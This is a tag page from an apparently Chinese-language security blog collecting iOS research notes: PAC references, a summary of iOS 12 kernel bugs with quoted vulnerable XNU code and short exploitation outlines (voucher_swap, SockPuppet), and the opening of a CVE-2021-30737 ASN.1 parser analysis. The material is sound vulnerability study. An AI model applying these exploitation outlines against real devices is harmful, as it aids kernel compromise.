<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>Tag: ios - buffer0verflooow - Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="buffer0verflooow - Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="buffer0verflooow - Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="buffer0verflooow - Blog"><meta property="og:url" content="https://buffer0verflooow.github.io/"><meta property="og:site_name" content="buffer0verflooow - Blog"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://buffer0verflooow.github.io/img/og_image.png"><meta property="article:author" content="buffer0verflooow"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://buffer0verflooow.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://buffer0verflooow.github.io"},"headline":"buffer0verflooow - Blog","image":["https://buffer0verflooow.github.io/img/og_image.png"],"author":{"@type":"Person","name":"buffer0verflooow"},"publisher":{"@type":"Organization","name":"buffer0verflooow - Blog","logo":{"@type":"ImageObject","url":"https://buffer0verflooow.github.io/img/logo.svg"}},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">ios</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-03T08:52:23.000Z" title="2022/5/3 16:52:23">2022-05-03</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-03T08:54:10.622Z" title="2022/5/3 16:54:10">2022-05-03</time></span><span class="level-item">a minute read (About 121 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/05/03/iOS-PAC%E6%9C%BA%E5%88%B6/">iOS PAC机制</a></p><div class="content"><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html">Examining Pointer Authentication on the iPhone XS</a></p>
<p><a target="_blank" rel="noopener" href="https://www.qualcomm.com/media/documents/files/whitepaper-pointer-authentication-on-armv8-3.pdf">Pointer Authentication on ARMv8.3 Design and Analysis of the New Software Security Instructions</a></p>
<p><a target="_blank" rel="noopener" href="https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf">Mark Rutland’s slides</a></p>
<p><a target="_blank" rel="noopener" href="https://lwn.net/Articles/718888/">this LWN article</a></p>
<p><a target="_blank" rel="noopener" href="https://static.docs.arm.com/ddi0596/a/DDI_0596_ARM_a64_instruction_set_architecture.pdf">ARM A64 Instruction Set Architecture</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.asm.im/2020/02/11/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89%E7%BB%95%E8%BF%87-A12-%E7%9A%84-PAC-%E5%AE%9E%E7%8E%B0-kexec/#%E5%89%8D%E8%A8%80">https://blog.asm.im/2020/02/11/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89%E7%BB%95%E8%BF%87-A12-%E7%9A%84-PAC-%E5%AE%9E%E7%8E%B0-kexec/#%E5%89%8D%E8%A8%80</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-02T11:29:56.000Z" title="2022/5/2 19:29:56">2022-05-02</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-03T13:33:12.763Z" title="2022/5/3 21:33:12">2022-05-03</time></span><span class="level-item">6 minutes read (About 854 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/05/02/iOS%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">iOS漏洞总结</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要想做两方面的工作：</p>
<ul>
<li>汇总自 iOS12.0 以来的所有漏洞，不涉及具体的漏洞分析；</li>
<li>整理 iOS 发展过程中引进的漏洞缓解措施，及其绕过方式。</li>
</ul>
<h1 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h1><h2 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h2><p>ARMv8.3-A 引入的安全功能之一是指针身份验证，该功能使用指针的高位来存储指针身份验证代码 (PAC)，它本质上是指针值的加密签名和一些额外的上下文。引入了特殊指令以向指针添加验证码并验证经过验证的指针的 PAC 并恢复原始指针值。</p>
<h1 id="iOS-12-x"><a href="#iOS-12-x" class="headerlink" title="iOS 12.x"></a>iOS 12.x</h1><h2 id="12-0-12-1-2"><a href="#12-0-12-1-2" class="headerlink" title="12.0 - 12.1.2"></a>12.0 - 12.1.2</h2><h3 id="voucher-swap-CVE-2019-6225"><a href="#voucher-swap-CVE-2019-6225" class="headerlink" title="voucher_swap (CVE-2019-6225)"></a>voucher_swap (<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6225">CVE-2019-6225</a>)</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>顾名思义，漏洞出现在<code>task_swap_mach_voucher()</code>函数<code>(osfmk/kern/task.c)</code>中，作用是用新的voucher替换旧的voucher：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Placeholders for the task set/get voucher interfaces */</span></span><br><span class="line">......</span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_swap_mach_voucher</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">task_t</span>			task,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_voucher_t</span>		new_voucher,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_voucher_t</span>		*in_out_old_voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (TASK_NULL == task)</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_TASK;</span><br><span class="line"></span><br><span class="line">	*in_out_old_voucher = new_voucher;</span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞触发是在 MIG 生成的代码中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Routine task_swap_mach_voucher */</span></span><br><span class="line">mig_internal novalue _Xtask_swap_mach_voucher</span><br><span class="line">	(<span class="type">mach_msg_header_t</span> *InHeadP, <span class="type">mach_msg_header_t</span> *OutHeadP)</span><br></pre></td></tr></table></figure>

<p>在<code>_Xtask_swap_mach_voucher()</code>里，将调用<code>task_swap_mach_voucher()</code>，从而导致引用计数的变化：</p>
<ol>
<li><code>new_voucher</code>的引用计数+1          &#x3D;&gt; <code>convert_port_to_voucher()</code></li>
<li><code>old_voucher</code>的引用计数+1          &#x3D;&gt; <code>convert_port_to_voucher()</code></li>
<li><code>old_voucher = new_voucher</code>      &#x3D;&gt; <code>task_swap_mach_voucher()</code></li>
<li><code>new_voucher</code>的引用计数-1           &#x3D;&gt; <code>ipc_voucher_release()</code></li>
<li><code>new_voucher</code>的引用计数-1 <code>(old_voucher = new_voucher)   =&gt; convert_voucher_to_port</code></li>
</ol>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
<li>分配大量<code>voucher</code>并释放它们；</li>
<li>通过漏洞，将<code>new_voucher</code>的引用计数减为0，形成悬空指针；</li>
<li>将该指针填充为假的<code>voucher</code>。</li>
</ol>
<h4 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h4><p>OOL端口描述符<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>。</p>
<h2 id="12-0-12-2-12-4"><a href="#12-0-12-2-12-4" class="headerlink" title="12.0 - 12.2&#x2F;12.4"></a>12.0 - 12.2&#x2F;12.4</h2><h3 id="SockPuppet-CVE-2019-8605"><a href="#SockPuppet-CVE-2019-8605" class="headerlink" title="SockPuppet (CVE-2019-8605)"></a>SockPuppet (<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8605">CVE-2019-8605</a>)</h3><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>问题出现在对<code>ip6_freepcbopts</code>的调用上，开发者的本意是：在某些情况下，通过释放每个指针后将其置为NULL来重用socket选项。但由于<code>in6p_outputopts</code>是由一个指向另一个结构的指针来表示的，所以它们是由辅助函数</p>
<p><code>ip6_freepcbopts</code>释放的，该函数不知道<code>inp</code>的地址，从而不能清除<code>&amp;inp-&gt;in6p_outputopts</code>，这段代码忽略了这一点，造成了悬空指针。</p>
<p>释放的缓冲区是由<code>setsockopt</code>创建的，意味着我们可以通过<code>getsockopt</code>和<code>setsockopt</code>来继续访问释放的缓冲区，分别代表着读取和写入原语。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">in6_pcbdetach</span><span class="params">(<span class="keyword">struct</span> inpcb *inp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ip_moptions</span> *<span class="title">imo</span>;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ip6_moptions</span> *<span class="title">im6o</span>;</span></span><br><span class="line"></span><br><span class="line">                inp-&gt;inp_vflag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (inp-&gt;in6p_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        m_freem(inp-&gt;in6p_options);</span><br><span class="line">                        inp-&gt;in6p_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">                &#125;</span><br><span class="line">                ip6_freepcbopts(inp-&gt;in6p_outputopts); <span class="comment">// &lt;- bad, dangling pointer</span></span><br><span class="line">                ROUTE_RELEASE(&amp;inp-&gt;in6p_route);</span><br><span class="line">                <span class="comment">// free IPv4 related resources in case of mapped addr</span></span><br><span class="line">                <span class="keyword">if</span> (inp-&gt;inp_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        (<span class="type">void</span>) m_free(inp-&gt;inp_options);</span><br><span class="line">                        inp-&gt;inp_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h4 id="堆风水-1"><a href="#堆风水-1" class="headerlink" title="堆风水"></a>堆风水</h4><p>OOL端口描述符<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>。</p>
<h2 id="12-4-1"><a href="#12-4-1" class="headerlink" title="12.4.1"></a>12.4.1</h2><h3 id="AppleAVE2Driver-exploit-CVE-2019-8795"><a href="#AppleAVE2Driver-exploit-CVE-2019-8795" class="headerlink" title="AppleAVE2Driver exploit (CVE-2019-8795)"></a>AppleAVE2Driver exploit (<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8795">CVE-2019-8795</a>)</h3><h3 id="AppleSPUProfileDriver-information-leak-CVE-2019-8794"><a href="#AppleSPUProfileDriver-information-leak-CVE-2019-8794" class="headerlink" title="AppleSPUProfileDriver information leak (CVE-2019-8794)"></a>AppleSPUProfileDriver information leak (<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8794">CVE-2019-8794</a>)</h3><h2 id="12-4-2-12-5-3"><a href="#12-4-2-12-5-3" class="headerlink" title="12.4.2 - 12.5.3"></a>12.4.2 - 12.5.3</h2><h3 id="oob-timestamp-CVE-2020-3837"><a href="#oob-timestamp-CVE-2020-3837" class="headerlink" title="oob_timestamp (CVE-2020-3837)"></a>oob_timestamp (<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3837">CVE-2020-3837</a>)</h3><h3 id="cuck00-information-leak-CVE-2020-3836"><a href="#cuck00-information-leak-CVE-2020-3836" class="headerlink" title="cuck00 information leak (CVE-2020-3836)"></a>cuck00 information leak (<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3836">CVE-2020-3836</a>)</h3><h2 id="12-3-12-5-3"><a href="#12-3-12-5-3" class="headerlink" title="12.3 - 12.5.3"></a>12.3 - 12.5.3</h2><h3 id="checkm8-CVE-2019-8900"><a href="#checkm8-CVE-2019-8900" class="headerlink" title="checkm8 (CVE-2019-8900)"></a><a target="_blank" rel="noopener" href="https://www.theiphonewiki.com/wiki/Checkm8_Exploit">checkm8</a> (<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8900">CVE-2019-8900</a>)</h3><p>硬件漏洞，暂不深究。</p>
<h1 id="堆风水-2"><a href="#堆风水-2" class="headerlink" title="堆风水"></a>堆风水</h1><h2 id="OOL端口描述符"><a href="#OOL端口描述符" class="headerlink" title="OOL端口描述符"></a>OOL端口描述符</h2><p><code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>。</p>
<h2 id="IOSurface"><a href="#IOSurface" class="headerlink" title="IOSurface"></a>IOSurface</h2></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-04-11T11:47:59.000Z" title="2022/4/11 19:47:59">2022-04-11</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-04-13T13:40:26.834Z" title="2022/4/13 21:40:26">2022-04-13</time></span><span class="level-item">35 minutes read (About 5191 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/04/11/iOS-ASN-1-%E6%BC%8F%E6%B4%9E-CVE-2021-30737/">iOS ASN.1 漏洞(CVE-2021-30737)</a></p><div class="content"><h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h2 id="ASN-1编码"><a href="#ASN-1编码" class="headerlink" title="ASN.1编码"></a>ASN.1编码</h2><p>ASN.1是一种Type-Length-Value序列化格式，ASN.1有一个特性，即，如果不知道值的长度，ASN.1仍能对它进行序列化，但是需要ASN.1按照基本编码规则(BER)进行编码。有一种更严格的编码叫区分编码规则(DER)，它强制要求一个特定的值只有一个正确的编码，并且不允许在不知道最终长度的情况下序列化值。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://luca.ntop.org/Teaching/Appunti/asn1.html">ASN.1指南</a></p>
</blockquote>
<p>这里仅介绍漏洞所需的ASN.1知识。</p>
<p>第一个是类型，其中5位定义了类型标识符。0x1f表示类型标识符不能在这5位中表示，需要其他的表示方法，而是以不同的方式进行编码。</p>
<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJvKMxjksjyIsG6m0LKukaFNjF_NRfiFDS4-rC8jg9smNCsH9emMFDKFncfg18NZxl0HWhsxa-FED-djCqDY7OdDF8-LRDdsGgz8S80Dx4r35EaIG_nYI_I78lbgnY_eQjayHZYpt1jA-O3MaCyOnHAfSjRNAz1L3pCwkSlvpNe9qrHrYwGUHWZaknCA/s600/image6%20%281%29.png" alt="Diagram showing first two bytes of a serialized ASN.1 object. The first byte in this case is the type and class identifier and the second is the length."></p>
<p>第一个字节的前两位表示该类型的类别：universal、application、content-specific或private。对我们来说，设置为0（universal）。</p>
<p>第6位如果为1，就说明这是一个原始编码，也就是说，在长度后面是可以直接解释为预定类型的内容。例如，作为ASN.1可打印字符串的 “HELLO”的原始编码将有一个长度为5的字节，后面是ASCII字符 “HELLO”。</p>
<p>第6位的值为0，表示这是一个构建的编码。这意味着长度后面的字节是一个或多个 “块 “的ASN.1编码，需要单独解析和串联以形成最终的输出值。还可以指定一个长度值为0，这意味着甚至不知道重建的输出会有多长，或者需要多少后续输入来完全建立输出。</p>
<p>这种最后的情况（长度不确定的构造类型）被称为不确定的形式。构成单个不确定值的输入的结束是由一个序列化的类型发出的信号，该类型的标识符、构造、类和长度值都等于0，它被编码为两个NULL字节。</p>
<h2 id="ASN-1-bitstrings"><a href="#ASN-1-bitstrings" class="headerlink" title="ASN.1 bitstrings"></a>ASN.1 bitstrings</h2><p>大多数ASN.1字符串类型不需要特殊处理，只是原始字节。它们中的一些有长度限制。例如：BMP字符串必须是偶数长度，UNIVERSAL字符串的长度必须是4字节的倍数，但仅此而已。</p>
<p>ASN.1比特串是比特的字符串，而不是字节的字符串。例如，可以有一个长度为一个比特的比特串（所以要么是0，要么是1）或者一个长度为127比特的比特串（所以是15个完整的字节加上一个额外的7比特。）</p>
<p>编码后的ASN.1比特串在长度之后、内容之前有一个额外的元数据字节，它编码了最后一个字节中未使用的比特数。</p>
<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLFuO8lb9EEiWHIAHNFcZQGqIWDtJ-V8DVI8GZC2Bc0d1qsrM3SugjE8dkb2z1IXa86wWlUiPJ4X0PquX_Vozl_6oJUNT9dU0LMgNh1x4L86-cjKpRuDpQdPRPbyp-Rmu0gbipzRY9XRmQz5q_7ZfmXW4MJ_6YcR735HO0YngIFvrYyjymoiwKYmP9RA/s600/image1%20%282%29.png" alt="Diagram showing the complete encoding of a 3-bit bitstring. The length of 2 includes the unused-bits count byte which has a value of 5, indicating that only the 3 most-significant bits of the final byte are valid."></p>
<h2 id="ASN-1解析"><a href="#ASN-1解析" class="headerlink" title="ASN.1解析"></a>ASN.1解析</h2><p>ASN.1数据总是需要与模板一起解码，模板告诉解析器应该期待什么数据，还提供输出指针，以填入解析后的输出数据。下面是一个例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> SecAsn1Template simple_bitstring_template[] = &#123;</span><br><span class="line">  &#123;</span><br><span class="line">    SEC_ASN1_BIT_STRING | SEC_ASN1_MAY_STREAM, <span class="comment">// kind: bit string,</span></span><br><span class="line">                                               <span class="comment">//  may be constructed</span></span><br><span class="line">    <span class="number">0</span>,     <span class="comment">// offset: in dest/src</span></span><br><span class="line">    <span class="literal">NULL</span>,  <span class="comment">// sub: subtemplate for indirection</span></span><br><span class="line">    <span class="keyword">sizeof</span>(SecAsn1Item) <span class="comment">// size: of output structure</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SecAsn1Item decoded = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">PLArenaPool* pool = PORT_NewArena(<span class="number">1024</span>);</span><br><span class="line">SECStatus status =</span><br><span class="line">  SEC_ASN1Decode(pool,     <span class="comment">// pool: arena for destination allocations</span></span><br><span class="line">                 &amp;decoded, <span class="comment">// dest: decoded encoded items in to here</span></span><br><span class="line">                 &amp;simple_bitstring_template, <span class="comment">// template</span></span><br><span class="line">                 asn1_bytes,      <span class="comment">// buf: asn1 input bytes</span></span><br><span class="line">                 asn1_bytes_len); <span class="comment">// len: input size</span></span><br></pre></td></tr></table></figure>

<h2 id="NSS-ASN-1-状态机"><a href="#NSS-ASN-1-状态机" class="headerlink" title="NSS ASN.1 状态机"></a>NSS ASN.1 状态机</h2><p>该状态机有两个核心数据结构。</p>
<p>-<br>  SEC_ASN1DecoderContext - 整体的解析环境。</p>
<ul>
<li>sec_asn1d_state - 一个单一的解析器状态，保存在一个双链接的列表中，形成一个嵌套状态的堆栈。</li>
</ul>
<p>部分字段如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">sec_asn1d_state_struct</span> &#123;</span></span><br><span class="line">  SEC_ASN1DecoderContext *top; </span><br><span class="line">  <span class="type">const</span> SecAsn1Template *theTemplate;</span><br><span class="line">  <span class="type">void</span> *dest;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sec_asn1d_state_struct</span> *<span class="title">parent</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sec_asn1d_state_struct</span> *<span class="title">child</span>;</span></span><br><span class="line">  sec_asn1d_parse_place place;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> contents_length;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> pending;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> consumed;</span><br><span class="line">  <span class="type">int</span> depth;</span><br><span class="line">&#125; sec_asn1d_state;</span><br></pre></td></tr></table></figure>

<p>解析状态机的主要引擎是SEC_ASN1DecoderUpdate方法，它接收一个上下文对象、原始输入缓冲区和长度：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SECStatus</span><br><span class="line"><span class="title function_">SEC_ASN1DecoderUpdate</span> <span class="params">(SEC_ASN1DecoderContext *cx,</span></span><br><span class="line"><span class="params">                       <span class="type">const</span> <span class="type">char</span> *buf, <span class="type">size_t</span> len)</span></span><br></pre></td></tr></table></figure>

<p>当前状态存储在上下文对象的current字段中，而该当前状态的place字段决定了解析器当前所处的状态，这些状态字段如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    beforeIdentifier,</span><br><span class="line">    duringIdentifier,</span><br><span class="line">    afterIdentifier,</span><br><span class="line">    beforeLength,</span><br><span class="line">    duringLength,</span><br><span class="line">    afterLength,</span><br><span class="line">    beforeBitString,</span><br><span class="line">    duringBitString,</span><br><span class="line">    duringConstructedString,</span><br><span class="line">    duringGroup,</span><br><span class="line">    duringLeaf,</span><br><span class="line">    duringSaveEncoding,</span><br><span class="line">    duringSequence,</span><br><span class="line">    afterConstructedString,</span><br><span class="line">    afterGroup,</span><br><span class="line">    afterExplicit,</span><br><span class="line">    afterImplicit,</span><br><span class="line">    afterInline,</span><br><span class="line">    afterPointer,</span><br><span class="line">    afterSaveEncoding,</span><br><span class="line">    beforeEndOfContents,</span><br><span class="line">    duringEndOfContents,</span><br><span class="line">    afterEndOfContents,</span><br><span class="line">    beforeChoice,</span><br><span class="line">    duringChoice,</span><br><span class="line">    afterChoice,</span><br><span class="line">    notInUse</span><br><span class="line">&#125; sec_asn1d_parse_place;</span><br></pre></td></tr></table></figure>

<p>状态机通过switch进行判断：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (state-&gt;place) &#123;</span><br><span class="line">    <span class="keyword">case</span> beforeIdentifier:</span><br><span class="line">      consumed = sec_asn1d_parse_identifier(state, buf, len);</span><br><span class="line">      what = SEC_ASN1_Identifier;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> duringIdentifier:</span><br><span class="line">      consumed = sec_asn1d_parse_more_identifier(state, buf, len);</span><br><span class="line">      what = SEC_ASN1_Identifier;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> afterIdentifier:</span><br><span class="line">      sec_asn1d_confirm_identifier(state);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

